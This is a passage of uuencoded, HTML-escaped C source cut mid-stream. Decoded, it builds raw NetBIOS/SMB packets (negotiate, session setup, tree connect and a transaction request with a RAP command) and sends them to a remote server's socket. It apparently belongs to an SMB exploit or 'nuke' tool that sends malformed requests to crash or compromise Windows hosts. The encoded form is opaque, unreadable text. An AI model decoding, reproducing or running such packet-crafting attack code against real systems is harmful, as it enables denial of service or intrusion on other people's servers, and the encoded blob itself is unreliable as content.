M96]F*%--0E]04D]43T-/3%,I.PT*#0H@4&amp;%C:V5T(#T@*&#039;5?8VAA&lt;B`J*2`H
M;6%L;&amp;]C*&quot;A086-K971,96YG=&amp;@@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BDI*B`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;!S:7IE;V8H=5]C:&amp;%R*2DI.R`-&quot;@T*#0HO*B!&quot;=6EL9&quot;!T:&amp;4@3F5T
M8FEO&lt;R!(96%D97(@*B\-&quot;@T*($)U:6QD3F)T*%!A8VME=&quot;Q086-K971,96YG
M=&amp;@I.PT*#0HO*B!&quot;=6EL9&quot;!T:&amp;4@4TU&quot;($)A&lt;V4@2&amp;5A9&amp;5R(&quot;HO#0H-&quot;B!&quot;
M=6EL9%-M8D)A&lt;V5(9&#039;(H4&amp;%C:V5T+#!X-S(I.PT*#0HO*B!&quot;=6EL9&quot;!T:&amp;4@
M3F5G&lt;&#039;)O=&quot;!297%U97-T($AE861E&lt;B`J+PT*#0H@3F5G4F5Q=65S=&quot;`](&quot;A3
M;6).96=0&lt;F]T4F5Q=65S=$AD&lt;B`J*2`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*%!A8VME
M=&quot;`K(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S
M:7IE;V8H4VUB0F%S94AD&lt;BDI.PT*(`T*($YE9U)E&lt;75E&lt;W0M/E=O&lt;F1#;W5N
M=&quot;`](#`[#0H-&quot;B\J5&amp;AE(&#039;9A;&#039;5E(&amp;]F($)Y=&amp;5#;W5N=&quot;!I&lt;R!G:79E;B!L
M:6ME(&#039;1H:7,L#0H@*B!D=64@=&amp;\@=&amp;AE(&amp;YE=&#039;=O&lt;FL@8GET92!O&lt;F1E&lt;FEN
M9PT*(&quot;H@;VX@;&amp;EN=7@@86YD(&#039;1H92!D969I;FET:6]N(&amp;]F(&#039;1H92!H96%D
M97(@#0H@*B!W:71H(&amp;%R&lt;F%Y&lt;RHO#0H-&quot;B!.96=297%U97-T+3Y&quot;&gt;71E0V]U
M;G1;,%T@/2!S:7IE;V8H4TU&quot;7U!23U1/0T],4RD@*R`Q.PT*#0HO*B@K(#$@
M9F]R(&#039;1H92!S:7IE(&amp;]F($)U9F9E&lt;D9O&lt;FUA=&quot;DJ+PT*#0H@3F5G4F5Q=65S
M=&quot;T^0G5F9F5R1F]R;6%T/3!X,#([#0H-&quot;B\J0V]P&gt;2!T:&amp;4@9&amp;EA;&amp;5C=&quot;!S
M=&#039;)I;F&lt;J+PT*#0H@;65M8W!Y*&quot;AU7V-H87(@*BD@*%!A8VME=&quot;`K(&#039;-I&gt;F5O
M9BA.8G1397-S:6]N2&amp;1R*0T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M*R!S:7IE;V8H4VUB0F%S94AD&lt;BD-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;L@&lt;VEZ96]F*%-M8DYE9U!R;W1297%U97-T2&amp;1R*2DL#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!334)?4%)/5$]#3TQ3+`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*%--0E]04D]43T-/3%,I*3L-&quot;@T*
M+RI4;W1A;&quot;!,96YG=&amp;@@;V8@=&amp;AE(&#039;!A8VME=&quot;!T;R!B92!S96YD+&quot;`-&quot;B`J
M(&#039;=E(&amp;UU&lt;W0@:6YC;&#039;5D92!T:&amp;4@3F5T0FEO&lt;R!H96%D97(J+PT*#0I086-K
M971,96YG=&amp;@@/2!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I
M&gt;F5O9BA3;6).96=0&lt;F]T4F5Q=65S=$AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M&lt;VEZ96]F*%--0E]04D]43T-/3%,I.PT*#0H@=W)I=&amp;4H4V]C:RQ086-K970L
M4&amp;%C:V5T3&amp;5N9W1H*3L-&quot;GT-&quot;@T*+RHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M+PT*#0HO*E1H:7,@9G5N8W1I;VX@&lt;V5N9&#039;,@82!3971U&lt;%@@&lt;F5Q=65S=&quot;!P
M86-K970J+PT*#0H-&quot;G9O:60@4V5N9%-E=&#039;5P6%)E&lt;75E&lt;W0H#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J3W5R(&#039;-O8VME=&quot;HO#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&amp;EN=&quot;!3;V-K+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`O
M*G1H92!L96YG=&amp;@@;V8@=&amp;AE(&amp;1O;6%I;B!N86UE(&#039;-T&lt;FEN9RHO#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EN=&quot;!$;VUA:6Y.86UE3&amp;5N9W1H+&quot;`-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@+RIT:&amp;4@1&amp;]M86EN(&amp;YA;64@&lt;W1R:6YG
M*B\-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@8VAA&lt;B`J1&amp;]M86EN3F%M92D-
M&quot;GL-&quot;B`-&quot;B!I;G0@4&amp;%C:V5T3&amp;5N9W1H.PT*(`T*(&#039;5?8VAA&lt;B`J4&amp;%C:V5T
M.PT*#0H@4VUB4V5T=7!84F5Q=65S=$AD&lt;B`J4V5T=7!84F5Q=65S=#L-&quot;@T*
M#0HO*B!4:&amp;4@;&amp;5N9W1H(&amp;]F(&#039;1H92!P86-K970@*&#039;=I=&amp;AO=70@3D540DE/
M4RD@.B`-&quot;B`J(%-M8B!&quot;87-E($AE861E&lt;B`K(%-M8B!3971U&lt;%@@4F5Q=65S
M=`T*(&quot;H@*R!$;VUA:6Y.86UE(&amp;%N9&quot;!.871I=F4@3U,@86YD($YA=&amp;EV92`-
M&quot;B`J(&amp;-L:65N=&quot;!S;W1W87)E(&#039;9E&lt;G-I;VX@&lt;W1R:6YG&lt;R`J+PT*#0H-&quot;B!0
M86-K971,96YG=&amp;@@/2!S:7IE;V8H4VUB0F%S94AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)3971U&lt;%A297%U97-T2&amp;1R*2`K#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@1&amp;]M86EN3F%M94QE;F=T:&quot;`K(#$@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@&lt;VEZ96]F*$Y!5$E615]/4U],04Y-04XI.PT*#0H@4&amp;%C:V5T(#T@*&#039;5?
M8VAA&lt;B`J*2`H;6%L;&amp;]C*&quot;A086-K971,96YG=&amp;@@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*2H@#0H@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H=5]C:&amp;%R*2DI
M.PT*#0HO*D)U:6QD(&#039;1H92!.971B:6]S($AE861E&lt;BHO#0H-&quot;B!&quot;=6EL9$YB
M=&quot;A086-K970L4&amp;%C:V5T3&amp;5N9W1H*3L-&quot;@T*+RI&quot;=6EL9&quot;!T:&amp;4@4TU&quot;($)A
M&lt;V4@2&amp;5A9&amp;5R*B\-&quot;@T*($)U:6QD4VUB0F%S94AD&lt;BA086-K970L,&#039;@W,RD[
M#0H-&quot;B\J0G5I;&amp;0@=&amp;AE(%-E=&#039;5P6&quot;!R97%U97-T(&amp;AE861E&lt;BHO#0H-&quot;B!3
M971U&lt;%A297%U97-T(#T@*%-M8E-E=&#039;5P6%)E&lt;75E&lt;W1(9&#039;(@*BD@#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;A086-K970@*R!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;L@&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I*3L-&quot;@T*
M#0HO*E-E=&quot;!V86QU92!O9B!T:&amp;4@;6%X:6UU;2!S:7IE(&amp;]F(&amp;1A=&amp;$@=&amp;\@
M&lt;F5C96EV92HO#0H-&quot;B!3971U&lt;%A297%U97-T+3Y-87A&quot;=69F97)3:7IE6S%=
M/3!X1D8[#0H-&quot;B\J0G5I;&amp;0@=&amp;AE(%-E=&#039;5P6&quot;!H96%D97(J+PT*#0H@4V5T
M=7!84F5Q=65S=&quot;T^5V]R9$-O=6YT/3!X9#L-&quot;@T*(%-E=&#039;5P6%)E&lt;75E&lt;W0M
M/D%N9%A#;VUM86YD/3!X9F8[#0H-&quot;B`O*D=I=F4@82!S:7IE(&amp;]F(&#039;1H92!P
M87-S=V]R9&quot;!3=&#039;)I;F&lt;@*$YU;&amp;P@8VAA&lt;F%C=&amp;5R*2P@#0H@(&quot;H@9F]R($%.
M4TD@0VAA&lt;F%C=&amp;5R(&quot;AT:&amp;4@#0H@(&quot;H@54Y)0T]$12!S=&#039;)I;F=S(&amp;%R92!N
M;W0@&lt;W5P&lt;&amp;]R=&amp;5D*B\-&quot;@T*(%-E=&#039;5P6%)E&lt;75E&lt;W0M/D-A&lt;V5);G-E;G-I
M=&amp;EV95!A&lt;W-W;W)D3&amp;5N9W1H6S!=(#T@,&#039;@P.PT*#0H@+RH@0V]U;G0@;V8@
M9&amp;%T82!B&gt;71E&lt;RHO#0H-&quot;B!3971U&lt;%A297%U97-T+3Y&quot;&gt;71E0V]U;G1;,%T@
M/2`@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@1&amp;]M86EN3F%M
M94QE;F=T:&quot;`K(#$@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&#039;-I&gt;F5O9BA.051)5D5?3U-?3$%.34%.*3L-&quot;B`-&quot;@T*(&amp;UE;6-P&gt;2@H=5]C
M:&amp;%R(&quot;H@*2`H4&amp;%C:V5T(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE
M;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I
M&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ
M96]F*%-M8E-E=&#039;5P6%)E&lt;75E&lt;W1(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(#$I+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@1&amp;]M86EN3F%M92P-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($1O;6%I;DYA;65,96YG=&amp;@I.PT*#0HO*B!)
M;F-R96UE;G1A=&amp;EO;B!O9B!$;VUA:6Y.86UE3&amp;5N9W1H+&quot;`-&quot;B`J(&#039;1O(&amp;AA
M=F4@82!N=6QL(&amp;-H87)A8W1E&lt;B!T97)M:6YA=&amp;5D(&#039;-T&lt;FEN9PT*(&quot;H@(&amp;9O
M&lt;B!T:&amp;4@9&amp;]M86EN(&amp;YA;64@&lt;W1R:6YG*B\-&quot;@T*($1O;6%I;DYA;65,96YG
M=&amp;@K*SL-&quot;@T*(&amp;UE;6-P&gt;2@H=5]C:&amp;%R(&quot;H@*2`H4&amp;%C:V5T(&quot;L@#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*R`-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K(`T*(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8E-E=&#039;5P6%)E&lt;75E&lt;W1(9&#039;(I
M(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!$;VUA:6Y.86UE3&amp;5N9W1H*2P-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@($Y!5$E615]/4U],04Y-04XL#0H@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3D%4259%7T]37TQ!3DU!3BDI.PT*
M#0HO*E=E(&#039;-E;F0@=&amp;AE(%!A8VME=&quot;!W:71H(&#039;1H92!N971B:6]S(&amp;AE861E
M&lt;B!S;R!W92!M=7-T(&amp;%D9&quot;!I=&quot;HO#0H-&quot;B!086-K971,96YG=&amp;@@/2!S:7IE
M;V8H4VUB0F%S94AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)3
M971U&lt;%A297%U97-T2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@1&amp;]M86EN3F%M
M94QE;F=T:&quot;`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.051)5D5?3U-?
M3$%.34%.*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(
M9&#039;(I(#L@#0H-&quot;B!W&lt;FET92A3;V-K+%!A8VME=&quot;Q086-K971,96YG=&amp;@I.PT*
M#0H@9G)E92A086-K970I.PT*?0T*#0HO*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHO#0H-&quot;B\O5&amp;AI&lt;R!F=6YC=&amp;EO;B!S96YD&lt;R!A(%1C;VY8(%)E&lt;75E&lt;W0@
M4&amp;%C:V5T#0H-&quot;G9O:60@4V5N9%1C;VY84F5Q=65S=&quot;AI;G0@4V]C:RQU7V-H
M87(@*E-M8E-E&lt;G9E&lt;DEP*0T*&gt;PT*(&amp;EN=&quot;!086-K971,96YG=&amp;@[#0H@=5]C
M:&amp;%R(&quot;I086-K970[#0H@=5]C:&amp;%R(&quot;I0871H.PT*#0H@4VUB0F%S94AD&lt;B`J
M4VUB0F%S93L-&quot;B!3;6)48V]N6%)E&lt;75E&lt;W1(9&#039;(@*E1C;VY84F5Q=65S=#L-
M&quot;@T*#0HO*B!4:&amp;4@;&amp;5N9W1H(&amp;]F(&#039;1H92!P86-K970@.B`@4VUB($)A&lt;V4@
M2&amp;5A9&amp;5R(&quot;L@#0H@*B!3;6(@5$-O;E@@4F5Q=65S=`T*(&quot;H@*R!P87)A;65T
M97)S(&#039;-T&lt;FEN9W,L(`T*(&quot;H@*R`Q(&amp;9O&lt;B!T:&amp;4@;&amp;5N9W1H(&amp;]F(&#039;1H92!P
M87-S=V]R9&quot;`J+PT*#0H-&quot;B!086-K971,96YG=&amp;@@/0ES:7IE;V8H4VUB0F%S
M94AD&lt;BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA3;6)48V]N6%)E&lt;75E
M&lt;W1(9&#039;(I(&quot;L-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S=&#039;)L96XH(EQ&lt;7%Q&lt;7&quot;(I(&quot;L-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S=&#039;)L96XH4VUB4V5R=F5R27`I(&quot;L-&quot;B`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H5$-/3EA?0T]-34%.1&quot;D@*PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(#$@.PT*(`T*(%!A8VME=&quot;`](&quot;AU7V-H87(@*BD@;6%L;&amp;]C*&quot;A0
M86-K971,96YG=&amp;@@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M&lt;VEZ96]F*$YB=%-E&lt;W-I;VY(9&#039;(I*2`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;H@&lt;VEZ96]F*&#039;5?8VAA&lt;BDI.PT*#0H-&quot;B\J0G5I;&amp;0@=&amp;AE
M($YE=&amp;)I;W,@2&amp;5A9&amp;5R*B\-&quot;@T*#0H@0G5I;&amp;1.8G0H4&amp;%C:V5T+%!A8VME
M=$QE;F=T:&quot;D[#0H-&quot;B\J0G5I;&amp;0@=&amp;AE(%--0B!&quot;87-E($AE861E&lt;BHO#0H-
M&quot;B!&quot;=6EL9%-M8D)A&lt;V5(9&#039;(H4&amp;%C:V5T+#!X-S4I.PT*#0H@4VUB0F%S92`]
M(&quot;A3;6)&quot;87-E2&amp;1R(&quot;HI(&quot;A086-K970@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2D[#0H-&quot;B!3;6)&quot;87-E
M+3Y5:61;,%T],&#039;@V-#L-&quot;B`-&quot;B\J0G5I;&amp;0@=&amp;AE(%1C;VY8(&#039;)E&lt;75E&lt;W0@
M:&amp;5A9&amp;5R*B\-&quot;@T*(%1C;VY84F5Q=65S=&quot;`](&quot;A3;6)48V]N6%)E&lt;75E&lt;W1(
M9&#039;(@*BD@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*%!A8VME=&quot;`K(`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8D)A&lt;V5(9&#039;(I*3L-&quot;@T*(%1C;VY84F5Q=65S=&quot;T^
M5V]R9$-O=6YT/3!X,#0[#0H-&quot;B!48V]N6%)E&lt;75E&lt;W0M/D%N9%A#;VUM86YD
M/3!X9F8[#0H-&quot;B`O*D=I=F4@82!S:7IE(&amp;9O&lt;B!T:&amp;4@&lt;&amp;%S&lt;W=O&lt;F0@4W1R
M:6YG(&quot;A.=6QL(&amp;-H87)A8W1E&lt;BDJ+PT*#0H@5&amp;-O;EA297%U97-T+3Y087-S
M=V]R9$QE;F=T:%LP72`](#!X,3L-&quot;@T*(&quot;\J1VEV92!A(&#039;9A;&#039;5E(&#039;1O(&#039;1H
M92`B0GET94-O=6YT(B!F:65L9&quot;HO#0H-&quot;B!48V]N6%)E&lt;75E&lt;W0M/D)Y=&amp;5#
M;W5N=%LP72`](`T*&quot;0D)&quot;7-T&lt;FQE;B@B7%Q&lt;7%Q&lt;(BD@*PT*&quot;0D)&quot;2L@&lt;W1R
M;&amp;5N*%-M8E-E&lt;G9E&lt;DEP*2`K#0H)&quot;0D)*R!S:7IE;V8H5$-/3EA?0T]-34%.
M1&quot;D@*PT*&quot;0D)&quot;3$@.PT*#0H@+RI&quot;=6EL9&quot;!T:&amp;4@4&amp;%T:&quot;!3=&#039;)I;F&lt;J+PT*
M#0H@4&amp;%T:&quot;`](&quot;AU7V-H87(@*BD@*&amp;UA;&amp;QO8RAS=&#039;)L96XH(EQ&lt;7%Q&lt;7&quot;(I
M*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S=&#039;)L96XH4VUB4V5R=F5R27`I*2D[
M(`T*(&quot;`-&quot;B!M96US970H4&amp;%T:&quot;PP+`T*(&quot;`@(&quot;`@(&quot;!S=&#039;)L96XH(EQ&lt;7%Q&lt;
M7&quot;(I*W-T&lt;FQE;BA3;6)397)V97))&lt;&quot;DI.PT*(`T*(&#039;-T&lt;FYC&lt;&#039;DH4&amp;%T:&quot;PB
M7%Q&lt;7&quot;(L&lt;W1R;&amp;5N*&quot;)&lt;7%Q&lt;(BDI.PT*(`T*(&#039;-T&lt;FYC870H4&amp;%T:&quot;Q3;6)3
M97)V97))&lt;&quot;QS=&#039;)L96XH4VUB4V5R=F5R27`I*3L-&quot;B`-&quot;B!S=&#039;)N8V%T*%!A
M=&amp;@L(EQ&lt;(BQS=&#039;)L96XH(EQ&lt;(BDI.PT*#0H@;65M8W!Y*&quot;AU7V-H87(@*BD@
M*%!A8VME=&quot;`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S
M&lt;VEO;DAD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8D)A
M&lt;V5(9&#039;(I*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H4VUB5&amp;-O;EA2
M97%U97-T2&amp;1R*2LQ*2P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@4&amp;%T:&quot;P-&quot;B`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;W1R;&amp;5N*%!A=&amp;@I*3L-&quot;@T*(&amp;UE;6-P&gt;2@H
M=5]C:&amp;%R(&quot;H@*2`H4&amp;%C:V5T(&quot;L@#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S
M:7IE;V8H3F)T4V5S&lt;VEO;DAD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&#039;-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M&lt;VEZ96]F*%-M8E1C;VY84F5Q=65S=$AD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&#039;-T&lt;FQE;BA0871H*2`K(#$I+`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@5$-/3EA?0T]-34%.1&quot;P-&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O
M9BA40T].6%]#3TU-04Y$*2D[#0H-&quot;B\J4V5N9&quot;!T:&amp;4@4&amp;%C:V5T*B\-&quot;@T*
M(%!A8VME=$QE;F=T:&quot;`]&quot;7-I&gt;F5O9BA3;6)&quot;87-E2&amp;1R*2`K#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@&lt;VEZ96]F*%-M8E1C;VY84F5Q=65S=$AD&lt;BD@*PT*(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&#039;-T&lt;FQE;B@B7%Q&lt;7%Q&lt;(BD@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@
M(&#039;-T&lt;FQE;BA3;6)397)V97))&lt;&quot;D@*PT*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O
M9BA40T].6%]#3TU-04Y$*2`K#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@,2`K(&#039;-I&gt;F5O
M9BA.8G1397-S:6]N2&amp;1R*3L-&quot;@T*(&#039;=R:71E*%-O8VLL4&amp;%C:V5T+%!A8VME
M=$QE;F=T:&quot;D[#0H-&quot;B!F&lt;F5E*%!A8VME=&quot;D[#0I]#0H-&quot;B\J*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ*BHJ
M*BHJ*BHJ*BHJ*BHJ*B\-&quot;@T*+RH@5&amp;AI&lt;R!F=6YC=&amp;EO;B!S96YD&lt;R!A(%1R
M86YS86-T:6]N(&#039;)E&lt;75E&lt;W0@4&amp;%C:V5T*B\-&quot;@T*=F]I9&quot;!396YD5&#039;)A;G-2
M97%U97-T*`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J3W5R(&#039;-O8VME=&quot;HO
M#0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@:6YT(%-O8VLL(`T*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;\J1F]R(&#039;1H92!4240@9FEE;&amp;0J+PT*(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;5?:6YT.%]T(&quot;I4:60I#0I[#0H@=5]C:&amp;%R(&quot;I086-K
M970[#0H@:6YT(%!A8VME=$QE;F=T:#L-&quot;B!3;6)&quot;87-E2&amp;1R(&quot;I3;6)&quot;87-E
M.PT*(%-M8E1R86YS4F5Q=65S=$AD&lt;B`J5&#039;)A;G-297%U97-T.PT*#0HO*B!4
M:&amp;4@;&amp;5N9W1H(&amp;]F(&#039;1H92!P86-K970@*%-M8B!&quot;87-E($AE861E&lt;B`K(`T*
M(&quot;H@4VUB(%1R86YS86-T:6]N(%)E&lt;75E&lt;W0-&quot;B`J(&quot;L@1&amp;EA;&amp;5C=&quot;!S=&#039;)I
M;F&lt;@*&quot;TQ(&amp;9O&lt;B!A;B!A;&amp;EG;F5M96YT(&#039;!R;V)L96TI*B\-&quot;@T*#0I086-K
M971,96YG=&amp;@@/0ES:7IE;V8H4VUB0F%S94AD&lt;BD@*R`-&quot;B`@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;!S:7IE;V8H4VUB5&#039;)A;G-297%U97-T2&amp;1R*2`K#0H@(&quot;`@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@&lt;VEZ96]F*$Y!345?4D%07T-/34U!3D0I+3$[#0H-&quot;E!A8VME=&quot;`]
M(&quot;AU7V-H87(@*BD@*&amp;UA;&amp;QO8R@H4&amp;%C:V5T3&amp;5N9W1H(&quot;L@#0H@(&quot;`@(&quot;`@
M(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#039;-I&gt;F5O9BA.8G1397-S:6]N2&amp;1R*2D-
M&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@*B!S:7IE;V8H=5]C:&amp;%R
M*2DI.PT*#0H-&quot;B\J($)U:6QD(&#039;1H92!.971B:6]S($AE861E&lt;B`J+PT*#0H@
M0G5I;&amp;1.8G0H4&amp;%C:V5T+%!A8VME=$QE;F=T:&quot;D[#0H-&quot;B\J($)U:6QD(&#039;1H
M92!334(@0F%S92!(96%D97(@*B\-&quot;@T*($)U:6QD4VUB0F%S94AD&lt;BA086-K
M970L,&#039;@R-2D[#0H-&quot;B\J(%1)1&quot;!N=6UB97(@9F]R(&#039;1H92!3;6(@0F%S92!(
M96%D97(J+PT*#0I3;6)&quot;87-E(#T@*%-M8D)A&lt;V5(9&#039;(@*BD@*%!A8VME=&quot;`K
M(`T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S:7IE;V8H3F)T4V5S&lt;VEO
M;DAD&lt;BDI.PT*#0IM96UC&lt;&#039;DH4VUB0F%S92T^5&amp;ED+%1I9&quot;PR*G-I&gt;F5O9BAU
